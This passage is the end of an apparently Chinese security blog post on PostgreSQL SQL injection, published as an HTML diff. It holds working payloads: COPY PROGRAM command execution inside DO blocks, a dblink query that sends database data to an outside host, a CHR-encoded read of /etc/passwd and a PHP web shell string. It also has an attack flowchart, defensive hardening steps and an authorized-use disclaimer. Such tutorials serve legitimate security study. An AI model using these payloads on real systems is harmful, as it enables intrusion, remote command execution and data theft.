PG_RETURN_TEXT_P(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、PL-pgSQL-代码执行"><a href="#六、PL-pgSQL-代码执行" class="headerlink" title="六、PL&#x2F;pgSQL 代码执行"></a>六、PL&#x2F;pgSQL 代码执行</h2><p>PL&#x2F;pgSQL 是 PostgreSQL 原生过程语言。在可堆叠查询场景下，使用 <code>DO</code> 匿名块可实现复杂逻辑并绕过部分 WAF。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- DO 块直接调用 COPY PROGRAM</span></span><br><span class="line">DO $$</span><br><span class="line"><span class="keyword">DECLARE</span> cmd text :<span class="operator">=</span> <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">EXECUTE</span> <span class="string">&#x27;COPY (SELECT &#x27;&#x27;&#x27;&#x27;) TO PROGRAM &#x27;&#x27;&#x27;</span> <span class="operator">||</span> cmd <span class="operator">||</span> <span class="string">&#x27;&#x27;&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 循环盲注：逐字符提取并在 NOTICE 中回显</span></span><br><span class="line">DO $$</span><br><span class="line"><span class="keyword">DECLARE</span></span><br><span class="line">    i <span class="type">integer</span>; c text; <span class="keyword">result</span> text :<span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">    <span class="keyword">FOR</span> i <span class="keyword">IN</span> <span class="number">1.</span><span class="number">.30</span> LOOP</span><br><span class="line">        <span class="keyword">SELECT</span> chr(ASCII(<span class="built_in">SUBSTRING</span>(current_database(), i, <span class="number">1</span>))) <span class="keyword">INTO</span> c;</span><br><span class="line">        IF c <span class="keyword">IS</span> <span class="keyword">NOT NULL</span> <span class="keyword">THEN</span> <span class="keyword">result</span> :<span class="operator">=</span> <span class="keyword">result</span> <span class="operator">||</span> c; <span class="keyword">END</span> IF;</span><br><span class="line">    <span class="keyword">END</span> LOOP;</span><br><span class="line">    RAISE NOTICE <span class="string">&#x27;Extracted: %&#x27;</span>, <span class="keyword">result</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line">$$;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- dblink 带外数据外传（需扩展已安装）</span></span><br><span class="line"><span class="keyword">CREATE</span> EXTENSION IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> dblink;</span><br><span class="line"><span class="keyword">SELECT</span> dblink_connect(</span><br><span class="line">    <span class="string">&#x27;host=10.0.0.1 port=53 user=exfil password=&#x27;</span> <span class="operator">||</span></span><br><span class="line">    (<span class="keyword">SELECT</span> current_database()) <span class="operator">||</span> <span class="string">&#x27; dbname=test&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、攻击决策流程图"><a href="#七、攻击决策流程图" class="headerlink" title="七、攻击决策流程图"></a>七、攻击决策流程图</h2><pre class="mermaid">flowchart TD
+    A[发现 SQL 注入点] --> B{堆叠查询?}
+    B -->|是| C{当前角色权限?}
+    B -->|否| D{有回显?}
+    D -->|有| E[联合查询 / 报错注入]
+    D -->|无| F[pg_sleep 时间盲注]
+    C -->|超级用户| G{攻击目标?}
+    C -->|普通用户| H[查询敏感数据]
+    G -->|读文件| I[pg_read_file / COPY FROM]
+    G -->|写文件| J[COPY TO / lo_export]
+    G -->|命令执行| K[COPY PROGRAM]
+    K --> L{成功?}
+    L -->|否| M[UDF 提权: 写入.so]
+    M --> N[CREATE FUNCTION 注册]
+    N --> O[sys_eval 命令执行]
+    L -->|是| P[获取 SHELL]
+    J --> P</pre>
+
+<h2 id="八、WAF-绕过与实战陷阱"><a href="#八、WAF-绕过与实战陷阱" class="headerlink" title="八、WAF 绕过与实战陷阱"></a>八、WAF 绕过与实战陷阱</h2><h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 注释符隔断关键字</span></span><br><span class="line"><span class="keyword">SELECT</span> PG_SLEEP<span class="comment">/**/</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- CHR() 字符构造绕过关键字</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_read_file(CHR(<span class="number">47</span>)<span class="operator">||</span>CHR(<span class="number">101</span>)<span class="operator">||</span>CHR(<span class="number">116</span>)<span class="operator">||</span>CHR(<span class="number">99</span>)<span class="operator">||</span></span><br><span class="line">    CHR(<span class="number">47</span>)<span class="operator">||</span>CHR(<span class="number">112</span>)<span class="operator">||</span>CHR(<span class="number">97</span>)<span class="operator">||</span>CHR(<span class="number">115</span>)<span class="operator">||</span>CHR(<span class="number">115</span>)<span class="operator">||</span>CHR(<span class="number">119</span>)<span class="operator">||</span>CHR(<span class="number">100</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 美元引号绕过单引号过滤</span></span><br><span class="line"><span class="keyword">SELECT</span> $tag$<span class="operator">&lt;</span>?php <span class="keyword">system</span>($_GET[&quot;c&quot;]);?<span class="operator">&gt;</span>$tag$;</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见陷阱"><a href="#常见陷阱" class="headerlink" title="常见陷阱"></a>常见陷阱</h3><ol>
+<li><strong>权限不足</strong>：<code>pg_read_file</code> 和 <code>COPY PROGRAM</code> 默认仅超级用户可用，云数据库（RDS、Cloud SQL）通常直接禁用。</li>
+<li><strong>WAL 日志</strong>：大对象和 COPY 操作全量记入 WAL，留下清晰的取证痕迹。</li>
+<li><strong>二进制读取</strong>：PG 14 之前需使用 <code>pg_read_binary_file()</code> 读取二进制文件，<code>pg_read_file()</code> 受编码影响可能截断。</li>
+<li><strong>OID 耗尽</strong>：32 位系统 OID 上限约 40 亿，密集 lo_import 可能耗尽 OID 池。</li>
+<li><strong>RDS 受限</strong>：AWS RDS 禁用文件系统函数和 COPY PROGRAM，攻击面收缩至 dblink 带外与数据窃取。</li>
+</ol>
+<h2 id="九、防御措施"><a href="#九、防御措施" class="headerlink" title="九、防御措施"></a>九、防御措施</h2><h3 id="开发层面"><a href="#开发层面" class="headerlink" title="开发层面"></a>开发层面</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 始终使用参数化查询</span></span><br><span class="line"><span class="keyword">PREPARE</span> safe_query (text) <span class="keyword">AS</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> $<span class="number">1</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> safe_query(<span class="string">&#x27;user_input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 最小权限：为应用创建受限角色，切忌授予 SUPERUSER</span></span><br><span class="line"><span class="keyword">CREATE</span> ROLE app_user LOGIN PASSWORD <span class="string">&#x27;strong_password&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span>, <span class="keyword">DELETE</span></span><br><span class="line">    <span class="keyword">ON</span> <span class="keyword">ALL</span> TABLES <span class="keyword">IN</span> SCHEMA public <span class="keyword">TO</span> app_user;</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据库加固"><a href="#数据库加固" class="headerlink" title="数据库加固"></a>数据库加固</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 回收危险函数的 public 执行权限（生产环境必做）</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> pg_read_file(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> pg_read_binary_file(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> pg_ls_dir(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> lo_import(text) <span class="keyword">FROM</span> public;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">EXECUTE</span> <span class="keyword">ON</span> <span class="keyword">FUNCTION</span> lo_export(oid, text) <span class="keyword">FROM</span> public;</span><br></pre></td></tr></table></figure>
+
+<h3 id="监控告警"><a href="#监控告警" class="headerlink" title="监控告警"></a>监控告警</h3><ul>
+<li>启用 <code>pg_stat_statements</code> 追踪可疑查询模式。</li>
+<li>对 <code>pg_largeobject</code> 表的异常 OID 创建设置告警。</li>
+<li>定期审计 <code>pg_proc</code> 系统表中非预期的 C 语言函数。</li>
+<li>分析 PostgreSQL 日志中的异常 <code>ERROR</code> 和完整 <code>STATEMENT</code>。</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PostgreSQL 的注入攻击面远不止数据窃取。从 <code>pg_sleep</code> 延时盲注，到 <code>pg_read_file</code> 任意文件读取，再到 <code>COPY PROGRAM</code> 直接命令执行，每条链路都可能被攻击者利用。深入理解这些特性并落实纵深防御，是每位 PostgreSQL DBA 与安全工程师的必修课。</p>
+<blockquote>
+<p>本文仅用于授权安全测试与学习，请勿用于非法用途。</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" rel="tag"># 数据库安全</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-services/" rel="prev" title="Windows提权：服务权限配置错误">
+                  <i class="fa fa-angle-left"></i> Windows提权：服务权限配置错误
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-scheduled-tasks/" rel="next" title="Windows提权：计划任务与启动项">
+                  Windows提权：计划任务与启动项 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
